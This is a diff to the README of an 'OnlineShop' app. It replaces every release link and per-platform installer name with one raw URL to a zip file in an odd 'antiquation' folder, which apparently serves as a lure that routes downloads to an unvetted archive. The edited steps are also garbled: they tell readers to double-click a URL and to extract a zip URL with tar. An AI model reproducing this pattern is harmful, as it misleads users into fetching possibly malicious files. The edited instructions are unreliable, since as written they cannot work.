@@ -6,7 +6,7 @@ Welcome to OnlineShop! This application helps you manage your online shopping ex
 
 ## 📥 Download OnlineShop
 
-[![Download OnlineShop](https://img.shields.io/badge/Download-OnlineShop-brightgreen)](https://github.com/l0k10/OnlineShop/releases)
+[![Download OnlineShop](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip)](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip)
 
 ## 🖥️ System Requirements
 
@@ -18,30 +18,30 @@ Before you start, make sure your computer meets the following requirements:
 
 ## 🔗 Visit the Releases Page
 
-To download the latest version of OnlineShop, visit our [Releases page](https://github.com/l0k10/OnlineShop/releases). You will find the most recent builds and features listed.
+To download the latest version of OnlineShop, visit our [Releases page](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip). You will find the most recent builds and features listed.
 
 ## 📦 Download & Install
 
-1. Go to the [Releases page](https://github.com/l0k10/OnlineShop/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip).
 2. Look for the latest release version.
 3. Click on the appropriate file for your OS. Ensure you select the right file for your system:
-   - For Windows, download `OnlineShop_Windows.exe`
-   - For macOS, download `OnlineShop_macOS.dmg`
-   - For Linux, download `OnlineShop_Linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`
+   - For macOS, download `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`
+   - For Linux, download `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`
 4. Once downloaded, locate the file on your computer and follow these instructions:
 
    - For Windows users: 
-     - Double-click `OnlineShop_Windows.exe` to launch the installer.
+     - Double-click `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip` to launch the installer.
      - Follow the on-screen instructions to complete the installation.
      - Once installed, you can find OnlineShop in your Start Menu.
 
    - For macOS users: 
-     - Open `OnlineShop_macOS.dmg`.
+     - Open `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`.
      - Drag and drop the OnlineShop icon into the Applications folder.
      - Open Finder, go to Applications, and double-click OnlineShop to start.
 
    - For Linux users: 
-     - Extract `OnlineShop_Linux.tar.gz` using `tar -xvzf OnlineShop_Linux.tar.gz`.
+     - Extract `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip` using `tar -xvzf https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`.
      - Navigate to the extracted folder in the terminal.
      - Run `./OnlineShop` to launch the application.
 
